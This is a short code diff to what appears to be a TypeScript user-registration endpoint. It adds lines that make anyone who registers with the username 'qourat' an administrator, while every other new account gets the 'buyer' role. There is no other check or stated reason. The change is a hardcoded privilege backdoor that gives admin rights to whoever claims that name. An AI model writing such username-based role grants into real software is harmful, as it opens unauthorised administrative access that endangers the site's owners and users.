@@ -56,9 +56,12 @@ export async function POST(req: Request) {
 
     // Hash password and create profile
     const passwordHash = await hashPassword(password);
+    const normalized = String(username).toLowerCase();
+    const defaultRole = normalized === 'qourat' ? 'admin' : 'buyer';
+
     const result = await sql`
       INSERT INTO public.profiles (username, email, password_hash, role, display_name, created_at, updated_at)
-      VALUES (${username}, ${email || null}, ${passwordHash}, 'buyer', ${username}, now(), now())
+      VALUES (${username}, ${email || null}, ${passwordHash}, ${defaultRole}, ${username}, now(), now())
       RETURNING id, username, role
     `;
 
